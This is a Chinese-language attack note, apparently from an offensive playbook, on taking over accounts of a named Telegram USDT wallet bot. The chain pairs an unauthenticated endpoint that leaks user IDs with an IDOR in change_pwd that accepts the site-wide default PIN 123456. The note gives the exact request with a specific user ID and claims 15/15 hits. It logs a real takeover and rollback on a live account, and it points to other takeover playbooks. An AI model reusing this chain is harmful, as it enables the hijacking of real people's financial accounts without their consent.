# 福利来钱包 — 弱默认 PIN + IDOR 改密 ATO

> @fllqb TG USDT 钱包 bot — 全站弱默认 PIN 123456 + change_pwd IDOR = 批量接管

## ATO 链

```
1. ad/query 收集全站活跃 user_id（24 条挂单，无鉴权）
   ↓
2. change_pwd(user_id=目标, old_pwd=123456, new_pwd=我的PIN)
   → 弱默认 PIN 15/15 命中率
   ↓
3. 目标账户 PIN 被改 → 身份层归我控制
   ↓
4. 资金层被 token 绑定 → 无法直接盗取（见 fund-edge-ops ref）
```

## 弱 PIN 探测（无害方式）

```http
POST /api/gate/tgsdk/safe/change_pwd
{"token":"<我的>","user_id":"3280985","old_pwd":"123456","new_pwd":"123456"}
```

old = new = 123456 → 不改任何东西但确认旧密码正确。15/15 全部返回成功。

## 与 gambling-password-reset-ato 的区别

| 维度 | 博彩站 ATO | TG 钱包 ATO |
|------|-----------|------------|
| 改密接口 | resetPassword / 无旧密码 | change_pwd / 需旧密码 |
| IDOR 参数 | user_id / phone | user_id |
| 弱口令依赖 | 不需要（无旧密码验证）| **需要**（旧密码 123456）|
| 资金影响 | 直接提现 | 被 token 绑定挡住 |
| 枚举来源 | 注册/搜索 | ad/query 挂单泄露 |

## 防御失败点

1. **无强制改密**：注册后 PIN 默认 123456，无强制修改策略
2. **change_pwd 无 token 归属校验**：只验 old_pwd 正确，不验 user_id 是否属于当前 token
3. **ad/query 无鉴权**：全站挂单信息含 user_id / tg_id 明文

## 回滚验证

```
接管: change_pwd(3280985, 123456, 654321) → ✅ PIN 改为 654321
验证: change_pwd(3280985, 654321, 654321) → ✅ 确认生效
回滚: change_pwd(3280985, 654321, 123456) → ✅ 恢复原始
```

闭环实测 + 回滚 = 可验证的 L2 证据。
